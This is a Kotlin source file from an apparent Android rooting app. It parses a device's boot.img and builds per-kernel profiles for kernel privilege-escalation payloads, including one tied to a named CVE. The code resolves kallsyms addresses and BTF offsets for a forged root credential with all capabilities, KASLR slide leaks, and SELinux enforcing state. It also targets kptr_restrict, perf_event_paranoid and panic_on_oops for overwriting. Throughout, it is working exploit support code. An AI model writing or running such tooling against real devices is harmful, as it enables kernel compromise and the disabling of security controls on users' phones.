package com.hexo141.liquidglass.bootimg

/**
 * Turns what [BootImageParser] read out of a `boot.img` into a profile the payload can load.
 *
 * Two kinds of values live in a profile:
 *
 * - **Kernel geometry** — struct offsets (BTF) and symbol offsets (kallsyms). These differ per
 *   build and are exactly what a new `boot.img` is parsed for, so they are derived here.
 * - **Run tuning** — retry counts, timeouts, route selection, physical load address. These are
 *   properties of the payload, not of the kernel build, so they are copied from the closest
 *   bundled profile instead of being invented; a wrong retry count only costs time, while a wrong
 *   struct offset fails the run.
 *
 * Struct offsets that cannot be derived keep the template's value (the closest same-major.minor
 * build is a reasonable approximation) and are listed in [ProfileBuild.missing] so the screen can
 * warn. **Symbol offsets are different**: they are `symbol - image_base` for one exact build, so a
 * value this image cannot prove is never carried over. A profile with a required address missing
 * is marked [ProfileBuild.blocked] and must not be saved - the native side would otherwise fall
 * back to its own hard-coded offset, which is just as wrong as the template's.
 */
object BootProfileBuilder {

    /** task_struct members the payload reads directly. */
    private val TASK_MEMBERS = listOf(
        "prio", "normal_prio", "sched_task_group",
        "pi_lock", "pi_waiters", "pi_top_task", "pi_blocked_on",
        "pid", "tgid", "atomic_flags",
        "real_cred", "cred", "comm", "tasks", "seccomp",
    )

    /**
     * Profile symbol → kallsyms name. `security_hook_heads` is a namespace array in newer
     * kernels; the aliases cover both spellings. `slide_*` are the same kind of symbol offsets,
     * only used to leak the KASLR slide.
     */
    private val SYMBOLS = linkedMapOf(
        "init_task" to listOf("init_task"),
        "init_cred" to listOf("init_cred"),
        "empty_zero_page" to listOf("empty_zero_page"),
        "root_task_group" to listOf("root_task_group"),
        "selinux_enforcing" to listOf("selinux_enforcing"),
        "selinux_blob_sizes" to listOf("selinux_blob_sizes"),
        "security_hook_heads" to listOf("security_hook_heads", "security_hook_heads_arr"),
        "slide_nfulnl_logger" to listOf("nfulnl_logger", "nfulnl_logger_arr"),
        "slide_loggers_0_1" to listOf("loggers", "nfulnl_logger"),
        "slide_boot_id" to listOf("random_boot_id", "sysctl_bootid", "boot_id"),
    )

    /**
     * `security_hook_heads` was removed by the 6.12 static-call LSM rework. Its absence is an
     * expected architecture difference, not a parse failure. Kept in step with
     * `GLK1_OPTIONAL_SYMBOLS` in the desktop `tools/profilectl.py`: the key is omitted and the
     * payload reads it as 0.
     */
    private val OPTIONAL_SYMBOLS = setOf("security_hook_heads")

    /** Credential fields the forged cred page needs; the rest of `struct cred` is not touched. */
    private const val CRED_CAPS_COUNT = 5L
    private const val CRED_USAGE_VALUE = 1L
    private const val CRED_CAPS_VALUE = -1L

    // ---------------------------------------------------------------- CVE-2026-98260

    /**
     * Call-site deltas, not symbol offsets.
     *
     * The 98260 payload leaks a KASLR slide by watching which `call_site` allocates a `k_itimer`,
     * so it needs the address *inside* `do_timer_create` where the allocation happens, not the
     * function entry. `+0xA8` and `+0x24` are the deltas the verified 6.1.134 / 6.6.118 images
     * use; they are properties of the two code paths, so they follow the source, not the build.
     */
    private const val TIMER_ALLOC_DELTA = 0xA8L
    private const val CRED_ALLOC_DELTA = 0x24L

    /** `copy_process` → `task_struct` allocation; only measured to be stable on the 6.6 GKI tree. */
    private const val TASK_ALLOC_DELTA_66 = 0x140L

    /**
     * Builds whose `task_struct` allocation call site was measured by hand.
     *
     * The delta is a compiler-layout fact, not a kernel-version fact: 6.1 needed 0x198 where 6.6
     * needs 0x140, and another 6.1 build can differ again. A build that is not listed keeps 0,
     * which the payload reads as "unknown" and replaces with its own size window.
     */
    private val TASK_ALLOC_DELTAS = mapOf(
        "6.1.134-android14-11-o-g5b336363ebad" to 0x198L,
    )

    /** `k_itimer.it_node`: identical from 5.10 to 6.6, so the payload carries it as a constant too. */
    private const val KITIMER_NODE = 0x78L

    /**
     * `PAGE_OFFSET` of a 48-bit VA arm64 kernel: `0xFFFFFF8000000000 - 0x80000000`, i.e.
     * `0xFFFFFF7F80000000`. The payload re-measures it at run time; this is only the fallback.
     */
    private const val PAGE_OFFSET_48 = -0x8000000000L - 0x80000000L

    /** Symbols the 98260 payload writes through; a wrong address here is a kernel panic. */
    private val C98260_SYMBOLS = linkedMapOf(
        "do_timer_create" to TIMER_ALLOC_DELTA,
        "prepare_creds" to CRED_ALLOC_DELTA,
        "selinux_state" to 0L,
        "init_user_ns" to 0L,
        "root_user" to 0L,
        "init_groups" to 0L,
        "init_ucounts" to 0L,
        // `--poke` targets. Optional: an older or trimmed kernel simply omits them, and the
        // payload then keeps its built-in 6.1.134 addresses instead of writing to a zero.
        "kptr_restrict" to 0L,
        "sysctl_perf_event_paranoid" to 0L,
        "panic_on_oops" to 0L,
    )

    /**
     * What [buildC98260] produced.
     *
     * [profile] is null whenever a required address is missing: unlike the 43499 profile, a
     * half-filled 98260 profile is not "worth a try" — the payload writes through those addresses
     * before it can verify anything, so an incomplete one is refused here instead.
     */
    data class C98260Build(
        val profile: Cve98260Profile?,
        val derived: List<String>,
        val missing: List<String>,
        val notes: List<String>,
    )

    /**
     * Builds the CVE-2026-98260 snapshot from the same parse that produced the GLK1 profile.
     *
     * Addresses stay link-time virtual addresses ([BootImageParser.ExtractedKernelInfo.symbols]
     * are read straight out of kallsyms), because this payload adds the slide itself.
     */
    fun buildC98260(info: BootImageParser.ExtractedKernelInfo): C98260Build {
        val release = info.release?.trim().orEmpty()
        val symbols = info.symbols
        val derived = mutableListOf<String>()
        val missing = mutableListOf<String>()
        val notes = info.notes.toMutableList()

        if (release.isEmpty()) missing += "release"
        if (symbols == null) notes += "kallsyms unavailable; CVE-2026-98260 needs the symbol addresses"

        fun address(symbol: String): Long? = symbols?.get(symbol)
        val resolved = LinkedHashMap<String, Long>()
        C98260_SYMBOLS.forEach { (symbol, delta) ->
            val value = address(symbol)
            if (value != null) {
                resolved[symbol] = value + delta
                derived += "$symbol${if (delta != 0L) "+0x${delta.toString(16)}" else ""}"
            } else {
                missing += symbol
            }
        }

        val task = info.taskStructLayout
        val cred = info.credLayout
        val kitimerSize = info.structOffsets?.kItimerSize
        if (task == null) missing += "task_struct (BTF)"
        if (cred == null) missing += "cred (BTF)"
        if (kitimerSize == null) missing += "k_itimer (BTF)"

        val taskCred = task?.memberOffsets?.get("cred")
        val taskSize = task?.size
        if (task != null && taskCred == null) missing += "task_struct.cred"
        if (task != null && taskSize == null) missing += "sizeof(task_struct)"

        // Every forged-cred field is required: a missing one would be written as offset 0, which
        // lands on `usage` and corrupts the credential instead of completing it.
        val credFields = linkedMapOf(
            "cred_size" to cred?.size,
            "cred_uid" to cred?.memberOffsets?.get("uid"),
            "cred_cap_inheritable" to cred?.memberOffsets?.get("cap_inheritable"),
            "cred_cap_permitted" to cred?.memberOffsets?.get("cap_permitted"),
            "cred_cap_effective" to cred?.memberOffsets?.get("cap_effective"),
            "cred_cap_bset" to cred?.memberOffsets?.get("cap_bset"),
            "cred_cap_ambient" to cred?.memberOffsets?.get("cap_ambient"),
            "cred_security" to cred?.memberOffsets?.get("security"),
            "cred_user" to cred?.memberOffsets?.get("user"),
            "cred_user_ns" to cred?.memberOffsets?.get("user_ns"),
            "cred_ucounts" to cred?.memberOffsets?.get("ucounts"),
            "cred_groups" to cred?.memberOffsets?.get("group_info"),
        )
        credFields.forEach { (name, value) ->
            if (value == null) missing += name else derived += name
        }

        val timerLink = resolved["do_timer_create"]
        val credLink = resolved["prepare_creds"]
        val selinuxLink = resolved["selinux_state"]
        val userNs = resolved["init_user_ns"]
        val rootUser = resolved["root_user"]
        val groups = resolved["init_groups"]
        val ucounts = resolved["init_ucounts"]
        val complete = release.isNotEmpty() &&
            timerLink != null && credLink != null && selinuxLink != null &&
            userNs != null && rootUser != null && groups != null && ucounts != null &&
            taskCred != null && taskSize != null && kitimerSize != null &&
            credFields.values.none { it == null }

        if (!complete) {
            notes += "CVE-2026-98260 profile not generated: ${missing.distinct().joinToString()}"
            return C98260Build(null, derived, missing.distinct(), notes.distinct())
        }

        // A call site has to look like one: both deltas sit in .text, so the two addresses must
        // share their top 32 bits. If they do not, one symbol was resolved to a different section.
        if ((timerLink!! ushr 32) != (credLink!! ushr 32)) {
            notes += "CVE-2026-98260 profile rejected: timer_link and cred_link are in different segments"
            return C98260Build(null, derived, (missing + "segment mismatch").distinct(), notes.distinct())
        }

        val taskAllocDelta = when {
            release.startsWith("6.6.") -> TASK_ALLOC_DELTA_66
            else -> TASK_ALLOC_DELTAS[release]
        }
        val taskAlloc = taskAllocDelta?.let { address("copy_process")?.plus(it) } ?: 0L

        val profile = Cve98260Profile(
            release = release,
            pageOffset = PAGE_OFFSET_48,
            timerLink = timerLink!!,
            credLink = credLink!!,
            selinuxLink = selinuxLink!!,
            userNs = userNs!!,
            rootUser = rootUser!!,
            groups = groups!!,
            ucounts = ucounts!!,
            taskAllocLink = taskAlloc,
            taskCred = taskCred!!,
            taskStructSize = taskSize!!,
            kitimerNode = KITIMER_NODE,
            kitimerSize = kitimerSize!!,
            credSize = credFields.getValue("cred_size")!!,
            credUid = credFields.getValue("cred_uid")!!,
            credCapInh = credFields.getValue("cred_cap_inheritable")!!,
            credCapPerm = credFields.getValue("cred_cap_permitted")!!,
            credCapEff = credFields.getValue("cred_cap_effective")!!,
            credCapBset = credFields.getValue("cred_cap_bset")!!,
            credCapAmb = credFields.getValue("cred_cap_ambient")!!,
            credOffSecurity = credFields.getValue("cred_security")!!,
            credOffUser = credFields.getValue("cred_user")!!,
            credOffUserNs = credFields.getValue("cred_user_ns")!!,
            credOffUcounts = credFields.getValue("cred_ucounts")!!,
            credOffGroups = credFields.getValue("cred_groups")!!,
            kptrLink = resolved["kptr_restrict"] ?: 0L,
            paranoidLink = resolved["sysctl_perf_event_paranoid"] ?: 0L,
            panicLink = resolved["panic_on_oops"] ?: 0L,
        )
        return C98260Build(profile, derived, missing.distinct(), notes.distinct())
    }

    data class ProfileBuild(
        val profile: Glk1Profile,
        /** Release of the bundled profile that supplied the run tuning. */
        val templateRelease: String,
        /** Values read from the image, as `section.key`. */
        val derived: List<String>,
        /** Values taken from the template because the image did not carry them. */
        val inherited: List<String>,
        /** Geometry the payload needs that neither source could prove. */
        val missing: List<String>,
        /**
         * Required `offset.*` addresses the image could not prove. Any entry here makes the
         * profile unsafe to save: the template's value belongs to another build, and the native
         * `or_default()` would substitute a compile-time hard-coded offset that is wrong too.
         */
        val blocked: List<String>,
        val notes: List<String>,
    )

    /**
     * @param templates every bundled profile, decoded; the closest one supplies run tuning
     * @return null when [info] has no release — a profile without one cannot be matched to a kernel
     */
    fun build(
        info: BootImageParser.ExtractedKernelInfo,
        imageName: String,
        templates: List<Glk1Profile>,
    ): ProfileBuild? {
        val release = info.release?.trim().orEmpty().ifEmpty { return null }
        val template = pickTemplate(release, templates) ?: return null

        val derived = mutableListOf<String>()
        val inherited = mutableListOf<String>()
        val missing = mutableListOf<String>()
        val blocked = mutableListOf<String>()
        val notes = info.notes.toMutableList()

        // Keep the template's section order: the payload reads sections by name, but a stable
        // order keeps two profiles for the same kernel byte-identical.
        val sections = LinkedHashMap<String, LinkedHashMap<String, Long>>()
        template.sections.forEach { (section, entries) ->
            sections[section] = LinkedHashMap(entries)
        }

        // The template's `offset` section is `symbol - image_base` for *that* build. Not one of
        // those addresses is valid for the image being parsed, so the whole section is dropped
        // before anything is derived. Every key written below is proven by this image; a failed
        // lookup simply leaves the key absent (the payload then reads 0).
        sections["offset"] = LinkedHashMap()

        fun put(section: String, key: String, value: Long?, fromImage: Boolean) {
            if (value != null) {
                sections.getOrPut(section) { LinkedHashMap() }[key] = value
                derived += "$section.$key"
            } else if (fromImage) {
                // The source exists but lacks this member: the retained template value is only an
                // approximation, so say so instead of presenting it as a complete profile.
                inherited += "$section.$key"
                missing += "$section.$key"
            } else {
                inherited += "$section.$key"
            }
        }

        fun inherit(section: String, key: String) {
            val value = template.value(section, key)
            if (value == null) missing += "$section.$key" else inherited += "$section.$key"
        }

        // ---- meta: the major version is the one thing the release string proves
        val major = release.substringBefore('.').toIntOrNull()
        if (major != null) {
            sections.getOrPut("meta") { LinkedHashMap() }["kernel_major"] = major.toLong()
            derived += "meta.kernel_major"
        } else {
            inherit("meta", "kernel_major")
            missing += "release.major"
        }
        listOf("recommend_shizuku", "fallback_route", "safe_mode").forEach { inherit("meta", it) }

        // ---- task_struct: every field from BTF, one by one
        val task = info.taskStructLayout
        if (task == null) notes += "no BTF for task_struct; those offsets are the template's"
        TASK_MEMBERS.forEach { member ->
            put("task_struct", member, task?.memberOffsets?.get(member), task != null)
        }

        // ---- cred: forged page layout follows the image's own struct cred
        val cred = info.credLayout
        put("cred", "copy_size", cred?.memberOffsets?.get("user_ns"), cred != null)
        put("cred", "usage_offset", cred?.memberOffsets?.get("usage") ?: 0L, cred != null)
        put("cred", "caps_offset", cred?.memberOffsets?.get("cap_inheritable"), cred != null)
        sections.getOrPut("cred") { LinkedHashMap() }["caps_count"] = CRED_CAPS_COUNT
        sections.getValue("cred")["caps_value"] = CRED_CAPS_VALUE
        sections.getValue("cred")["usage_value"] = CRED_USAGE_VALUE
        derived += "cred.caps_count"
        // Refcount repair only exists on kernels that still refcount cred through pointers.
        listOf(
            "ref_count", "ref0_offset", "ref1_offset", "ref2_offset", "ref3_offset",
            "ref0_image", "ref1_image", "ref2_image", "ref3_image",
        ).forEach { inherit("cred", it) }

        // ---- offset: symbol address minus the image base, as the payload expects
        val symbols = info.symbols
        if (symbols == null) notes += "kallsyms unavailable; no symbol offset can be proven"
        SYMBOLS.forEach { (field, names) ->
            val direct = names.firstNotNullOfOrNull { symbols?.get(it) }
            // Newer kernels fold `enforcing` into `selinux_state` and stop exporting a standalone
            // symbol. Synthesize only when BTF proves the member offset - never guess an address.
            val address = direct ?: if (field == "selinux_enforcing") {
                val state = symbols?.get("selinux_state")
                val memberOffset = info.selinuxStateEnforcingOffset
                if (state != null && memberOffset != null) {
                    notes += "selinux_enforcing 无独立符号 => selinux_state+0x" +
                        memberOffset.toString(16) + " (BTF enforcing offset)"
                    state + memberOffset
                } else null
            } else null
            val offset = address?.let { it - info.imageBase }?.takeIf { it in 0..0xFFFF_FFFFL }
            if (offset != null) {
                put("offset", field, offset, fromImage = true)
            } else {
                // The key stays absent (the section was reset above). A missing symbol is not a
                // cosmetic gap: neither the template's address nor the native hard-coded fallback
                // points into this kernel, so a required one blocks the whole profile.
                missing += "offset.$field"
                when {
                    field in OPTIONAL_SYMBOLS ->
                        notes += "optional $field not in image; key omitted (6.12+ static-call LSM)"
                    symbols == null -> notes += "kallsyms unavailable: $field cannot be resolved"
                    else -> notes += "symbol not found: ${names.first()}"
                }
                if (field !in OPTIONAL_SYMBOLS) blocked += "offset.$field"
            }
        }
        if (blocked.isNotEmpty()) {
            notes += "模板的 offset 段已丢弃；${blocked.size} 个必需地址无法证明，43499 画像不可用（不继承绝对地址）"
        }

        // ---- kernel: all constants of the payload, not of the image.
        // mm_struct_sz is the slab bucket kernelSnitch steps through, not sizeof(struct mm_struct):
        // the BTF size (960 on 6.1) rounds up to the same 1024 bucket the bundled profile carries,
        // so the template value stays authoritative.
        listOf(
            "kernel_phys_load", "kernel_phys_offset",
            "compact_waiter", "kernelsnitch_collisions", "mm_struct_sz",
        ).forEach { inherit("kernel", it) }

        if (template.release == release) {
            notes += "a bundled profile exists for this release; saving overrides it on this device"
        }

        return ProfileBuild(
            profile = Glk1Profile(release = release, sections = sections),
            templateRelease = template.release,
            derived = derived,
            inherited = inherited,
            missing = missing.distinct(),
            blocked = blocked.distinct(),
            notes = notes.distinct(),
        )
    }

    /**
     * Closest bundled profile: same major.minor first (6.1.x shares the struct layouts), then the
     * same major, then anything — the run tuning is the part that matters, and it is not version
     * specific.
     */
    private fun pickTemplate(release: String, templates: List<Glk1Profile>): Glk1Profile? {
        if (templates.isEmpty()) return null
        val major = release.substringBefore('.')
        val majorMinor = release.split('.').take(2).joinToString(".")
        fun majorMinorOf(profile: Glk1Profile) =
            profile.release.split('.').take(2).joinToString(".")
        fun patchOf(value: String): Int =
            value.substringAfter('.', "").substringAfter('.', "").takeWhile { it.isDigit() }
                .toIntOrNull() ?: 0
        val targetPatch = patchOf(release)
        // Same major.minor, closest patch: 6.1.134 prefers the bundled 6.1.134 over 6.1.115,
        // because its retry budget was tuned on the nearer build.
        return templates.firstOrNull { it.release == release }
            ?: templates.filter { majorMinorOf(it) == majorMinor }
                .minByOrNull { kotlin.math.abs(patchOf(it.release) - targetPatch) }
            ?: templates.firstOrNull { it.release.substringBefore('.') == major }
            ?: templates.first()
    }
}
